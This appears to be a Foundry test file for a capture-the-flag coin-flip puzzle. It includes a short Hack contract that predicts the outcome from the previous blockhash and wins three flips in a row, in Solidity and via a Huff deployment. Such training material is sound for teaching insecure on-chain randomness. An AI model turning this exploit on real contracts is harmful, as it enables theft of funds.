// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.15;

import "foundry-huff/HuffDeployer.sol";
import "forge-std/Test.sol";
import "forge-std/console.sol";

import {CoinFlip} from "src/Challenge3-coinflip/Puzzle.sol";

contract Challenge3Test is Test {
    /// @dev Address of the SimpleStore contract.
    CoinFlip public puzzle;
    address player = makeAddr("player");

    /// @dev Setup the testing environment.
    function setUp() public {
        vm.roll(3);
        puzzle = new CoinFlip();
    }

    function testSimpleHack() public {
        vm.startPrank(player);
        Hack h = new Hack(address(puzzle));
        
        h.hack();
        vm.roll(block.number + 1);
        h.hack();
        vm.roll(block.number + 1);
        h.hack();
        vm.roll(block.number + 1);
        
        vm.stopPrank();
        assertTrue(puzzle.consecutiveWins() >= 3);
    }

    function testHackHuff() public {
        address hack = HuffDeployer
        .config()
        .with_addr_constant("PUZZLE", address(puzzle))
        .deploy("Challenge3-coinflip/Hack");

        Hack h = Hack(hack);

        h.hack();
        vm.roll(block.number + 1);
        h.hack();
        vm.roll(block.number + 1);
        h.hack();
        vm.roll(block.number + 1);

        assertTrue(puzzle.consecutiveWins() >= 3);
    }
}

contract Hack {
    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    address puzzle;
    constructor(address _puzzle) {
        puzzle = _puzzle;
    }

    function hack() public {
        uint256 coinFlip = uint256(blockhash(block.number - 1)) / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        CoinFlip(puzzle).flip(side);
    }
}